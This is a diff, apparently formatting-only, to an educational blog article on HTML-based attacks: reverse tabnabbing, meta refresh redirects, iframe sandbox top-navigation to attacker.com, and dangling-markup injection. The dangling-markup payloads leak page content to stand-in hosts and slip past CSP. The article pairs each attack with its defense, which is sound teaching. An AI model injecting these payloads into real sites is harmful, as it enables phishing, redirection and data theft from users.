@@ -20,7 +20,7 @@ Finally, some of the attack techniques mentioned in this article have already be
 
 What's the problem with this code snippet?
 
-``` html
+```html
 <a href="https://blog.huli.tw" target="_blank">My blog</a>
 ```
 
@@ -40,9 +40,9 @@ This type of attack is called reverse tabnabbing, where the URL of the original 
 
 If you are a frontend developer and have ESLint installed, you have probably come across a rule that requires hyperlinks to have `rel="noreferrer noopener"`. This is to separate the newly opened page from the original page, so that the new page does not have an `opener`, preventing this type of attack.
 
-After this behavior was [exposed](https://mathiasbynens.github.io/rel-noopener/), it sparked a lot of discussion. Many people were surprised by the existence of this behavior. The initial discussion can be found here: [Windows opened via a target=_blank should not have an opener by default #4078](https://github.com/whatwg/html/issues/4078). It wasn't until 2019 that the spec changed the default behavior in this PR, making `target=_blank` imply `noopener`: [Make target=_blank imply noopener; support opener #4330](https://github.com/whatwg/html/pull/4330).
+After this behavior was [exposed](https://mathiasbynens.github.io/rel-noopener/), it sparked a lot of discussion. Many people were surprised by the existence of this behavior. The initial discussion can be found here: [Windows opened via a target=\_blank should not have an opener by default #4078](https://github.com/whatwg/html/issues/4078). It wasn't until 2019 that the spec changed the default behavior in this PR, making `target=_blank` imply `noopener`: [Make target=\_blank imply noopener; support opener #4330](https://github.com/whatwg/html/pull/4330).
 
-[Safari](https://trac.webkit.org/changeset/237144/webkit/) and [Firefox](https://bugzilla.mozilla.org/show_bug.cgi?id=1522083) have followed suit, and although Chromium was a bit late, it also caught up by the end of 2020: [Issue 898942: Anchor target=_blank should imply rel=noopener](https://bugs.chromium.org/p/chromium/issues/detail?id=898942).
+[Safari](https://trac.webkit.org/changeset/237144/webkit/) and [Firefox](https://bugzilla.mozilla.org/show_bug.cgi?id=1522083) have followed suit, and although Chromium was a bit late, it also caught up by the end of 2020: [Issue 898942: Anchor target=\_blank should imply rel=noopener](https://bugs.chromium.org/p/chromium/issues/detail?id=898942).
 
 Therefore, as of 2023, if you are using the latest version of a browser, you won't have this problem. Opening a new hyperlink will not allow the new page to access the `opener`, so the old page will not be redirected to strange places.
 
@@ -52,20 +52,20 @@ One of the meanings of the word "meta" is "self". For example, data is informati
 
 The most common meta tags are:
 
-``` html
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="Attacking via HTML">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Attacking via HTML">
-<meta property="og:locale" content="zh_TW">
+```html
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="Attacking via HTML" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Attacking via HTML" />
+<meta property="og:locale" content="zh_TW" />
 ```
 
 These tags can be used to specify the page's encoding, viewport properties, description, Open Graph title, and more. This is what the meta tags are used for.
 
 In addition to these, there is one attribute that attackers are particularly interested in: `http-equiv`. In fact, I used this attribute when demonstrating CSP earlier. Besides CSP, it can also be used for webpage redirection:
 
-``` html
+```html
 <meta http-equiv="refresh" content="3;url=https://example.com" />
 ```
 
@@ -83,8 +83,16 @@ The defense against this type of attack is to filter out meta tags in user input
 
 The `<iframe>` tag allows embedding another website within one's own website. The most common example is a blog's comment system or embedding YouTube videos. When sharing a YouTube video, you can directly copy the HTML containing the iframe:
 
-``` html
-<iframe width="560" height="315" src="https://www.youtube.com/embed/6WZ67f9M3RE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+```html
+<iframe
+  width="560"
+  height="315"
+  src="https://www.youtube.com/embed/6WZ67f9M3RE"
+  title="YouTube video player"
+  frameborder="0"
+  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+  allowfullscreen
+></iframe>
 ```
 
 When a website allows users to insert iframes themselves, it can lead to some problems. For example, it allows inserting a phishing page:
@@ -99,9 +107,9 @@ Similar to reverse tabnabbing, when a website can access the `window` of other p
 
 For iframes, it can be done like this:
 
-``` js
+```js
 // top refers to the top-level window
-top.location = 'https://example.com'
+top.location = "https://example.com";
 ```
 
 However, this behavior will be blocked by the browser, and the following error message will appear:
@@ -110,8 +118,11 @@ However, this behavior will be blocked by the browser, and the following error m
 
 As the error message suggests, because these two windows are not same-origin, the navigation is blocked. However, there are ways to bypass this. Simply modify the iframe like this:
 
-``` html
-<iframe src="https://attacker.com/" sandbox="allow-scripts allow-top-navigation"></iframe>
+```html
+<iframe
+  src="https://attacker.com/"
+  sandbox="allow-scripts allow-top-navigation"
+></iframe>
 ```
 
 When an iframe has the `sandbox` attribute, it enters sandbox mode, where many features are automatically disabled and need to be explicitly enabled. The following features can be enabled:
@@ -138,7 +149,7 @@ This vulnerability has been found in [codimd](https://github.com/hackmdio/codimd
 
 As for defense, if the website should not have iframes in the first place, make sure to filter them out. If they must be used, do not allow users to specify the sandbox attribute themselves.
 
-For more practical examples and an introduction to iframes, you can refer to [Preventing XSS is not that easy](https://blog.huli.tw/2021/05/25/en/prevent-xss-is-not-that-easy/) and [Iframe and window.open black magic](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/).
+For more practical examples and an introduction to iframes, you can refer to [Preventing XSS is not that easy](https://blog.huli.tw/2021/05/25/en/prevent-xss-is-not-that-easy/) and [Iframe and window.open dark magic](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/).
 
 ## Attacks carried out through forms
 
@@ -170,7 +181,7 @@ For more details, refer to the original article: [Stealing passwords from infose
 
 In addition to the mentioned attacks, there is another attack method called dangling markup. It is easier to understand with an example:
 
-``` php
+```php
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -193,7 +204,7 @@ In this example, we can inject HTML into the page through the query string. Howe
 
 We can pass in: `<img src="http://example.com?q=`, the key point is that this `<img>` tag is not closed and the attribute is not enclosed in double quotes. After combining with the original HTML, it becomes:
 
-``` html
+```html
 <div>
   Hello, <img src="http://example.com?q=
   <div>
@@ -213,22 +224,23 @@ Therefore, if you run the above HTML in Chrome, you will see that the request is
 
 But if your injection point happens to be inside the `<head>`, you can bypass Chrome's restrictions using `<link>`:
 
-``` html
+```html
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta http-equiv="Content-Security-Policy" content="script-src 'none'; style-src 'none'; form-action 'none'; frame-src 'none';">
-  <link rel=icon href="http://localhost:5555?q=
-</head>
-<body>
-  <div>
-  Hello, 
-  <div>
-    Your account balance is: 1337
-  </div>
-  <footer><img src="footer.png"></footer>
-</div>
-</body>
+  <head>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="script-src 'none'; style-src 'none'; form-action 'none'; frame-src 'none';"
+    />
+    <link rel=icon href="http://localhost:5555?q=
+  </head>
+  <body>
+    <div>
+      Hello,
+      <div>Your account balance is: 1337</div>
+      <footer><img src="footer.png" /></footer>
+    </div>
+  </body>
 </html>
 ```
 
